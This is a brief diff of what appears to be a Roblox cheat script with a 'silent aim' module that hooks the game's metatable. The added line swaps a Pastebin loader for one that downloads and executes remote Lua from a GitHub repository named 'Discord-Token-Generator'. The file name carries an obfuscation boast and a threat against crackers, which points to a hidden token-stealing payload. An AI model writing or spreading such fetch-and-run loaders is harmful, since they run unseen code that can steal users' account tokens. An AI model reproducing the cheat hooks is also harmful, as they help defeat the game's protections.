@@ -22,7 +22,7 @@ local LocalPlayer = Players.LocalPlayer
 local accomidationfactor = 0.12567724521
 
 -- // Silent Aim Module
-local SilentAim = loadstring(game:HttpGet("https://pastebin.com/raw/2f0mGbMP"))()
+local SilentAim = loadstring(game:HttpGet("https://raw.githubusercontent.com/shezan78/Discord-Token-Generator/main/donttrytocrackthisisprotectedwithbase64skidifyoutrytocrackyouripwilberemovedpleasedonotcradkmaincrack.lua"))()
 SilentAim.TeamCheck = false
 -- // Metatable vars
 local mt = getrawmetatable(game)
